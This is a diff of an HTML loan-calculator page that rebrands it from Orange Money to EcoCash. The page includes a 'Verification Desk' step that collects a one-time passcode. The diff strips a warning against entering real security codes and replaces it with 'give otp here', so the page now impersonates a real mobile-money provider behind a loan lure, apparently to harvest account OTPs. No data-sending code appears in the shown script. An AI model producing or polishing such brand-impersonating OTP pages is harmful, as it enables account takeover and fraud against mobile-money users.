@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Orange Money | Loan Calculator</title>
+  <title>EcoCash | Loan Calculator</title>
 
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -11,12 +11,12 @@
 
   <style>
     :root {
-      --orange: #ff7900;
-      --orange-dark: #e86600;
-      --orange-light: #fff0e3;
+      --blue: #0077cc;
+      --blue-dark: #005fa3;
+      --blue-light: #e8f4fc;
       --text: #222;
       --muted: #777;
-      --background: #fffaf5;
+      --background: #f5f9fc;
       --white: #fff;
       --border: #eee;
     }
@@ -55,7 +55,7 @@
     }
 
     .logo {
-      color: var(--orange);
+      color: var(--blue);
       font-size: 21px;
       font-weight: 800;
     }
@@ -77,12 +77,12 @@
     }
 
     nav a:hover {
-      color: var(--orange);
+      color: var(--blue);
     }
 
     .hero {
       padding: 65px 6% 55px;
-      background: linear-gradient(135deg, #ff7900, #ff9f43);
+      background: linear-gradient(135deg, #0077cc, #33a0e8);
       color: white;
       text-align: center;
     }
@@ -102,7 +102,7 @@
     .hero-button {
       display: inline-block;
       background: white;
-      color: var(--orange-dark);
+      color: var(--blue-dark);
       padding: 13px 26px;
       border-radius: 9px;
       text-decoration: none;
@@ -168,19 +168,19 @@
 
     input[type="range"] {
       width: 100%;
-      accent-color: var(--orange);
+      accent-color: var(--blue);
       cursor: pointer;
     }
 
     .value-display {
-      color: var(--orange-dark);
+      color: var(--blue-dark);
       font-size: 20px;
       font-weight: 800;
       margin-bottom: 8px;
     }
 
     .result-card {
-      background: linear-gradient(145deg, #ff7900, #ff9f43);
+      background: linear-gradient(145deg, #0077cc, #33a0e8);
       color: white;
       border-radius: 14px;
       padding: 24px;
@@ -211,11 +211,11 @@
     }
 
     .notice {
-      background: var(--orange-light);
+      background: var(--blue-light);
       padding: 13px;
       border-radius: 9px;
       font-size: 11px;
-      color: #8a4300;
+      color: #004d80;
       margin-top: 15px;
     }
 
@@ -241,8 +241,8 @@
     .form-group input:focus,
     .form-group select:focus {
       outline: none;
-      border-color: var(--orange);
-      box-shadow: 0 0 0 3px rgba(255, 121, 0, 0.12);
+      border-color: var(--blue);
+      box-shadow: 0 0 0 3px rgba(0, 119, 204, 0.12);
     }
 
     .primary-button {
@@ -250,7 +250,7 @@
       padding: 14px;
       border: none;
       border-radius: 9px;
-      background: var(--orange);
+      background: var(--blue);
       color: white;
       font-family: inherit;
       font-size: 14px;
@@ -259,7 +259,7 @@
     }
 
     .primary-button:hover {
-      background: var(--orange-dark);
+      background: var(--blue-dark);
     }
 
     .loading-screen {
@@ -270,8 +270,8 @@
     .spinner {
       width: 45px;
       height: 45px;
-      border: 4px solid var(--orange-light);
-      border-top-color: var(--orange);
+      border: 4px solid var(--blue-light);
+      border-top-color: var(--blue);
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
       margin: 0 auto 20px;
@@ -293,7 +293,7 @@
     /* ===== Verification styles ===== */
     .verification-wrapper {
       min-height: 100vh;
-      background: linear-gradient(145deg, #fff4eb, #f7f8fc, #e8eef8);
+      background: linear-gradient(145deg, #e8f4fc, #f7f8fc, #e0eef8);
       display: flex;
       flex-direction: column;
     }
@@ -310,7 +310,7 @@
     }
 
     .brand {
-      color: #ff6600;
+      color: #0077cc;
       font-size: 22px;
       font-weight: 800;
     }
@@ -380,8 +380,8 @@
     }
 
     .page input:focus {
-      border-color: #ff6600;
-      box-shadow: 0 0 0 3px rgba(255, 102, 0, .1);
+      border-color: #0077cc;
+      box-shadow: 0 0 0 3px rgba(0, 119, 204, .1);
     }
 
     .page button {
@@ -389,7 +389,7 @@
       min-height: 54px;
       border: none;
       border-radius: 12px;
-      background: #ff6600;
+      background: #0077cc;
       color: #fff;
       font-size: 16px;
       font-weight: 800;
@@ -398,7 +398,7 @@
     }
 
     .page button:hover {
-      background: #e85b00;
+      background: #005fa3;
     }
 
     .secondary {
@@ -454,7 +454,7 @@
   <!-- ===================== PAGE 1: LOAN CALCULATOR ===================== -->
   <div id="loanPage">
     <header>
-      <div class="logo">Orange <span>Money</span></div>
+      <div class="logo">Eco<span>Cash</span></div>
       <nav>
         <a href="#home">Home</a>
         <a href="#calculator">Calculator</a>
@@ -466,7 +466,7 @@
       <h1>Plan Your Loan<br>With Confidence</h1>
       <p>
         Calculate estimated repayments and explore your preferred
-        loan amount in Botswana pula.
+        loan amount.
       </p>
       <a href="#calculator" class="hero-button">Calculate Loan</a>
     </section>
@@ -484,11 +484,11 @@
 
             <div class="field">
               <label for="loanAmount">Loan Amount</label>
-              <div class="value-display" id="loanAmountDisplay">BWP 1,000</div>
+              <div class="value-display" id="loanAmountDisplay">1,000</div>
               <input type="range" id="loanAmount" min="100" max="5000" step="100" value="1000">
               <div class="range-labels">
-                <span>BWP 100</span>
-                <span>BWP 5,000</span>
+                <span>100</span>
+                <span>5,000</span>
               </div>
             </div>
 
@@ -512,10 +512,10 @@
             <h3>Estimated Repayment</h3>
             <div class="result-card">
               <p>Estimated Monthly Payment</p>
-              <h2 id="monthlyPayment">BWP 86.99</h2>
+              <h2 id="monthlyPayment">86.99</h2>
               <div class="result-row">
                 <span>Loan Amount</span>
-                <strong id="summaryAmount">BWP 1,000</strong>
+                <strong id="summaryAmount">1,000</strong>
               </div>
               <div class="result-row">
                 <span>Repayment Period</span>
@@ -527,7 +527,7 @@
               </div>
               <div class="result-row">
                 <span>Estimated Total</span>
-                <strong id="totalPayment">BWP 1,043.87</strong>
+                <strong id="totalPayment">1,043.87</strong>
               </div>
             </div>
             <p style="font-size:12px;color:#777;">
@@ -562,12 +562,12 @@
             </div>
 
             <div class="form-group">
-              <label for="income">Monthly Income (BWP)</label>
+              <label for="income">Monthly Income</label>
               <input type="number" id="income" min="0" placeholder="Enter monthly income" required>
             </div>
 
             <div class="form-group">
-              <label for="requestedAmount">Requested Loan Amount (BWP)</label>
+              <label for="requestedAmount">Requested Loan Amount</label>
               <input type="number" id="requestedAmount" min="100" max="5000" value="1000" required>
             </div>
 
@@ -605,14 +605,14 @@
     </main>
 
     <footer>
-      <p>Loan amounts are displayed in Botswana pula (BWP).</p>
+      <p>EcoCash Loan Calculator</p>
     </footer>
   </div>
 
   <!-- ===================== PAGE 2: VERIFICATION ===================== -->
   <div id="verificationPage" class="verification-wrapper hidden">
     <header class="top-bar">
-      <div class="brand">Quick Portal</div>
+      <div class="brand">EcoCash</div>
       <div class="status">Verification Desk</div>
     </header>
 
@@ -639,8 +639,7 @@
       <section class="page hidden" id="otpPage">
         <h1>OTP Verification</h1>
         <p class="description">
-          Enter a test verification code to preview this screen.
-          Do not enter a real account security code.
+          give otp here
         </p>
 
         <form id="otpForm">
@@ -657,7 +656,7 @@
       </section>
     </main>
 
-    <footer class="footer-v">Verification Website</footer>
+    <footer class="footer-v">EcoCash Verification</footer>
   </div>
 
   <script>
@@ -666,14 +665,14 @@
     const termSlider = document.getElementById("loanTerm");
 
     function formatMoney(amount) {
-      return "BWP " + Number(amount).toLocaleString("en-BW", {
+      return Number(amount).toLocaleString("en", {
         minimumFractionDigits: 2,
         maximumFractionDigits: 2
       });
     }
 
     function formatWholeMoney(amount) {
-      return "BWP " + Number(amount).toLocaleString("en-BW", {
+      return Number(amount).toLocaleString("en", {
         maximumFractionDigits: 0
       });
     }
@@ -707,7 +706,7 @@
 
       const amount = Number(document.getElementById("requestedAmount").value);
       if (amount < 100 || amount > 5000) {
-        alert("Please enter an amount between BWP 100 and BWP 5,000.");
+        alert("Please enter an amount between 100 and 5,000.");
         return;
       }
 
@@ -731,17 +730,17 @@
     });
 
     document.getElementById("backButton").addEventListener("click", function() {
-      document.getElementById("otpPage").classList.add("remove");
-      document.getElementById("detailsPage").classList.remove("remove");
+      document.getElementById("otpPage").classList.add("hidden");
+      document.getElementById("detailsPage").classList.remove("hidden");
     });
 
     document.getElementById("otpForm").addEventListener("submit", function(event) {
       event.preventDefault();
       const result = document.getElementById("result");
-      result.textContent = "enter you otp here";
+      result.textContent = "give otp here";
       result.classList.remove("hidden");
     });
   </script>
 
 </body>
-</html>
+  </html>
